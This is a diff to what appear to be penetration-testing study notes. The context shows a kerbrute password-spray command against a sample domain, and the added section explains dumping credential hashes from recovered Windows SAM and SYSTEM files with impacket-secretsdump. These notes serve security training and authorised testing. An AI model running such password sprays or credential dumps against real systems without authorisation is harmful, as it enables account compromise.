@@ -107,3 +107,9 @@ This time our brute forcing is aimed at obtaining a Kerberos Ticket Granting Tic
 ```powershell
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "password123"
 ```
+
+### SAM/SYSTEM
+If we have managed to find a backup of an old Windows system then we may have unprivileged access to a SYSTEM and SAM file, containing secrets and credentials from that old system. Some of the hashes may still be relevant. Get the `SAM` and `SYSTEM` files back to Kali and parse like so:
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM local > old-hashes.txt
+```
